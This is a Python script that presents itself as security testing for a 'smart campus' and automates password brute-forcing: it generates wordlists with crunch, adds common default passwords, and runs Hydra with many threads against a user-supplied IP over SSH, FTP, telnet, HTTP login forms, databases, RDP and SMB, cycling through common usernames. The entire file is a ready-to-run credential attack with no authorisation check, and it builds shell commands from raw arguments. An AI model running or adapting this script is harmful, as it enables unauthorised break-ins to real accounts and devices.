#!/usr/bin/env python3
"""
Aggressive Brute Force Attack Script using Crunch and Hydra
For Smart Campus Security Testing
"""
import sys
import subprocess
import os
from datetime import datetime

def generate_wordlist_crunch(output_file="wordlist.txt"):
    """Generate aggressive wordlist using crunch"""
    print("[*] Generating wordlist with Crunch...")
    
    # Generate wordlist: 4-8 characters, lowercase, numbers, common patterns
    crunch_commands = [
        # Common weak passwords
        f"crunch 4 8 -t @@@@%%%% -o {output_file}",
        # Year-based patterns
        f"crunch 8 8 -t 2024%%%% >> {output_file}",
        # Admin patterns
        f"crunch 5 10 -t admin%%% >> {output_file}",
        # Pi patterns (raspberry pi)
        f"crunch 4 12 -t pi%%%% >> {output_file}",
        f"crunch 4 12 -t raspberry%%% >> {output_file}"
    ]
    
    for cmd in crunch_commands:
        try:
            print(f"[+] Running: {cmd}")
            subprocess.run(cmd, shell=True, timeout=60)
        except subprocess.TimeoutExpired:
            print("[!] Crunch command timed out, moving on...")
        except Exception as e:
            print(f"[!] Error: {e}")
    
    # Add common default passwords manually
    common_passwords = [
        "raspberry", "pi", "admin", "password", "123456", "12345678",
        "root", "toor", "admin123", "raspberry123", "pi123",
        "smartcampus", "campus123", "sensor123", "esp32",
        "default", "changeme", "welcome", "admin@123"
    ]
    
    try:
        with open(output_file, 'a') as f:
            for pwd in common_passwords:
                f.write(pwd + '\n')
        print(f"[+] Wordlist generated: {output_file}")
    except Exception as e:
        print(f"[!] Error writing wordlist: {e}")

def run_hydra_attack(target_ip, service, username, wordlist):
    """Execute aggressive Hydra brute force attack"""
    print(f"\n[*] Starting Hydra brute force attack")
    print(f"[*] Target: {target_ip}")
    print(f"[*] Service: {service}")
    print(f"[*] Username: {username}")
    print(f"[*] Timestamp: {datetime.now()}")
    
    # Hydra command variations based on service
    hydra_commands = {
        'ssh': f"hydra -l {username} -P {wordlist} -t 16 -V -f {target_ip} ssh",
        'ftp': f"hydra -l {username} -P {wordlist} -t 16 -V -f {target_ip} ftp",
        'telnet': f"hydra -l {username} -P {wordlist} -t 16 -V -f {target_ip} telnet",
        'http': f"hydra -l {username} -P {wordlist} -t 16 -V -f {target_ip} http-get",
        'http-post': f"hydra -l {username} -P {wordlist} -t 16 -V -f {target_ip} http-post-form '/login:username=^USER^&password=^PASS^:Invalid'",
        'mysql': f"hydra -l {username} -P {wordlist} -t 4 -V -f {target_ip} mysql",
        'postgres': f"hydra -l {username} -P {wordlist} -t 4 -V -f {target_ip} postgres",
        'rdp': f"hydra -l {username} -P {wordlist} -t 4 -V -f {target_ip} rdp",
        'smb': f"hydra -l {username} -P {wordlist} -t 8 -V -f {target_ip} smb"
    }
    
    cmd = hydra_commands.get(service, hydra_commands['ssh'])
    
    print(f"\n[+] Executing Hydra attack...")
    print(f"[+] Command: {cmd}\n")
    
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=600
        )
        
        print(result.stdout)
        
        if "login:" in result.stdout.lower() or "password:" in result.stdout.lower():
            print("\n[+] SUCCESS! Credentials found:")
            print(result.stdout)
        else:
            print("\n[-] No credentials found or attack unsuccessful")
            
        if result.stderr:
            print(f"\n[!] Errors/Warnings:\n{result.stderr}")
            
    except subprocess.TimeoutExpired:
        print("[!] Hydra attack timed out after 10 minutes")
    except Exception as e:
        print(f"[!] Error during Hydra attack: {str(e)}")

def brute_force_multiple_users(target_ip, service, wordlist):
    """Try multiple common usernames"""
    common_usernames = ['root', 'admin', 'pi', 'administrator', 'user', 'ubuntu', 'guest']
    
    print(f"\n[*] Attempting brute force with multiple usernames...")
    
    for username in common_usernames:
        print(f"\n{'='*60}")
        print(f"[*] Trying username: {username}")
        print(f"{'='*60}")
        run_hydra_attack(target_ip, service, username, wordlist)

def main():
    if len(sys.argv) < 4:
        print("Usage: python3 brute_force.py <target_ip> <service> <username>")
        print("Services: ssh, ftp, telnet, http, http-post, mysql, postgres, rdp, smb")
        print("Username: specific username or 'multi' for multiple attempts")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    service = sys.argv[2]
    username = sys.argv[3]
    
    wordlist = "wordlist.txt"
    
    # Generate wordlist
    generate_wordlist_crunch(wordlist)
    
    # Execute attack
    if username.lower() == 'multi':
        brute_force_multiple_users(target_ip, service, wordlist)
    else:
        run_hydra_attack(target_ip, service, username, wordlist)
    
    # Cleanup
    if os.path.exists(wordlist):
        print(f"\n[*] Cleaning up wordlist...")
        # Comment out to keep wordlist for inspection
        # os.remove(wordlist)

if __name__ == "__main__":
    main()